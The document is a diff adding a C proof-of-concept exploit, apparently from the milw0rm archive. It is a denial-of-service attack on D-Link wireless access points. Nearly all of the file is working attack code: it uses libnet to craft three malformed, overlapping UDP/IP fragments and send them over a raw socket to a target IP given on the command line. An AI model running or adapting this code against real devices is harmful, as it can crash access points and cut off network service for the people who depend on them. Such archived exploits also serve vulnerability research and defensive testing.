@@ -1,0 +1,187 @@
+/*
+ *  
+ * Aaron Portnoy
+ *  
+ * silc.thunkers.net, thunkers
+ *  
+ * D-Link Wireless Access Point
+ * Fragmented UDP DoS Proof of Concept 
+ *  
+ *
+ * gcc -o dlink_dos dlink_dos.c -lnet -Wall 
+ *    
+ */     
+    
+#include <libnet.h>
+    
+#define DEVICE "eth0"
+#define SRC_IP "127.0.0.1"
+#define DST_IP "127.0.0.1"
+#define SRC_PRT 200
+#define DST_PRT 11111
+    
+void usage (char *name)
+{   
+    fprintf (stderr,
+             "Usage: %s -s <source ip> -d <destination ip>\ 
+			-a <source port> -b <destination port> \n",
+             name);
+        
+    exit (EXIT_FAILURE);
+}
+    
+int gen_packet (char *device, char *pSRC, char *pDST, u_short sPRT,
+                u_short dPRT, int count)
+{                           
+
+    libnet_t *l = NULL;
+    libnet_ptag_t udp = 0;
+    libnet_ptag_t ip = 0;
+    
+    char errbuf[LIBNET_ERRBUF_SIZE];
+    char *payload = NULL;
+    u_short payload_s = 0, src_prt, dst_prt;
+    u_long src_ip, dst_ip;
+    int c, frag;
+        
+    if (!device)
+        device = DEVICE;
+        
+    l = libnet_init (LIBNET_RAW4, device, errbuf);
+
+    if (!l) {
+        fprintf (stderr, "libnet_init() failed: %s\n", errbuf);
+        exit (EXIT_FAILURE);
+    }
+	
+    src_ip = pSRC ? libnet_name2addr4 (l, pSRC, LIBNET_RESOLVE) :
+        libnet_name2addr4 (l, SRC_IP, LIBNET_RESOLVE);
+
+    dst_ip = pDST ? libnet_name2addr4 (l, pDST, LIBNET_RESOLVE) :
+        libnet_name2addr4 (l, DST_IP, LIBNET_RESOLVE);
+
+    src_prt = sPRT ? sPRT : SRC_PRT;
+
+    dst_prt = dPRT ? dPRT : DST_PRT;
+
+    if (count == 1) {
+        payload = "\0\0\0\0\0\0\0\0";
+        payload_s = 8;
+    }
+
+    udp = libnet_build_udp (src_prt,
+                            dst_prt,
+                            (LIBNET_UDP_H + payload_s) * 2,
+                            0, (unsigned char *)payload, payload_s, l, udp);
+
+    if (udp == -1) {
+        fprintf (stderr, "Can't build UDP header: %s\n", libnet_geterror (l));
+        exit (EXIT_FAILURE);
+    }
+
+    switch (count) {
+
+    case 1:
+        frag = IP_MF;
+        break;
+
+    case 2:
+        frag = 0x2002;
+        break;
+
+    case 3:
+        frag = 0x0003;
+        break;
+    }
+
+    ip = libnet_build_ipv4 (20,
+                            0,
+                            1800,
+                            frag,
+                            128,
+                            IPPROTO_UDP, 0, src_ip, dst_ip, NULL, 0, l, ip);
+
+    if (ip == -1) {
+        fprintf (stderr, "Can't build IP header: %s\n", libnet_geterror (l));
+        exit (EXIT_FAILURE);
+    }
+
+    c = libnet_write (l);
+
+    if (c == -1) {
+        fprintf (stderr, "Write error: %s\n", libnet_geterror (l));
+        exit (EXIT_FAILURE);
+    }
+
+    printf ("Wrote UDP packet; check the wire.\n");
+
+    libnet_destroy (l);
+
+    return (EXIT_SUCCESS);
+
+}
+
+int main (int argc, char **argv)
+{
+
+    int i;
+    char *pDST, *pSRC, *device;
+    u_short dPRT = 0;
+    u_short sPRT = 0;
+
+    pDST = pSRC = device = NULL;
+
+    while ((i = getopt (argc, argv, "D:d:s:a:b:h")) != EOF) {
+        switch (i) {
+        case 'D':
+            device = optarg;
+            break;
+        case 'd':
+            pDST = optarg;
+            break;
+        case 's':
+            pSRC = optarg;
+            break;
+        case 'a':
+            sPRT = atoi (optarg);
+            break;
+        case 'b':
+            dPRT = atoi (optarg);
+            break;
+        case 'h':
+            usage (argv[0]);
+            break;
+        }
+    }
+
+    printf ("\n----------------------------------\n");
+    printf ("      -=    D-Link DoS PoC     =-\n");
+    printf ("          Aaron Portnoy\n");
+    printf ("       deft () thunkers ! net     \n");
+    printf ("   silc.thunkers.net, thunkers\n");
+    printf ("----------------------------------\n");
+
+
+    device ? printf ("\nDevice: \t%s\n", device) :
+        printf ("\nDevice: \t%s\n", DEVICE);
+
+    pSRC ? printf ("SRC IP: \t%s\n", pSRC) :
+        printf ("SRC IP: \t%s\n", SRC_IP);
+
+    pDST ? printf ("DST IP: \t%s\n", pDST) :
+        printf ("DST IP: \t%s\n", DST_IP);
+
+    sPRT ? printf ("SPort: \t\t%d\n", sPRT) :
+        printf ("SPort: \t\t%d\n", SRC_PRT);
+
+    dPRT ? printf ("DPort: \t\t%d\n\n", dPRT) :
+        printf ("DPort: \t\t%d\n\n", DST_PRT);
+
+    for (i = 1; i <= 3; i++)
+        gen_packet (device, pSRC, pDST, sPRT, dPRT, i);
+    printf ("\n");
+
+    return (EXIT_SUCCESS);
+}
+
+// milw0rm.com [2006-02-14]
